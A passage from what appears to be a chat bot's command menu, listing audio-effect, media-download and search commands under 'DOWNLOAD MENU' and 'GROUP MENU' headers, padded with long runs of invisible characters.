‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
▯ ⍟ ${prefix}secvn
▯ ⍟ ${prefix}secvideo
▯ ⍟ ${prefix}tomp3
▯ ⍟ ${prefix}tomp4
▯ ⍟ ${prefix}toimg
▯ ⍟ ${prefix}baby
▯ ⍟ ${prefix}bass
▯ ⍟ ${prefix}reverse
▯ ⍟ ${prefix}slow
▯ ⍟ ${prefix}squirrel
▯ ⍟ ${prefix}blub
▯ ⍟ ${prefix}fat
▯ ⍟ ${prefix}imagetourl
▯ ⍟ ${prefix}voice
▯ ⍟ ${prefix}nightcore
▯ ⍟ ${prefix}cm
▯ ⍟ ${prefix}fast
▯ ⍟ ${prefix}gemes
▯ ⍟ ${prefix}slowvid
▯ ⍟ ${prefix}fastvid
▯ ⍟ ${prefix}reversevid
▯ ⍟ ${prefix}tts
 ⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
⍟▭▭▭▭𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 𝙼𝙴𝙽𝚄▭▭‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
▯ ⍟ ${prefix}play
▯ ⍟ ${prefix}video
▯ ⍟ ${prefix}ytshorts
▯ ⍟ ${prefix}ytmp3
▯ ⍟ ${prefix}ytmp4
▯ ⍟ ${prefix}igdl
▯ ⍟ ${prefix}ytsearch
▯ ⍟ ${prefix}igstory
▯ ⍟ ${prefix}scplay
▯ ⍟ ${prefix}pinterest
▯ ⍟ ${prefix}telesticker
▯ ⍟ ${prefix}githubsearch
▯ ⍟ ${prefix}googleimage
▯ ⍟ ${prefix}ytdesk
▯ ⍟ ${prefix}lyric
▯ ⍟ ${prefix}playstore
▯ ⍟ ${prefix}mediafire
▯ ⍟ ${prefix}fb
▯ ⍟ ${prefix}tiktoknown
▯ ⍟ ${prefix}tiktokaudio
▯ ⍟ ${prefix}tiktokdl
▯ ⍟ ${prefix}twitter
▯ ⍟ ${prefix}tinyurl
▯ ⍟ ${prefix}google
 ⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
⍟▭▭▭▭𝙶𝚁𝙾𝚄𝙿 𝙼𝙴𝙽𝚄▭▭▭▭‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎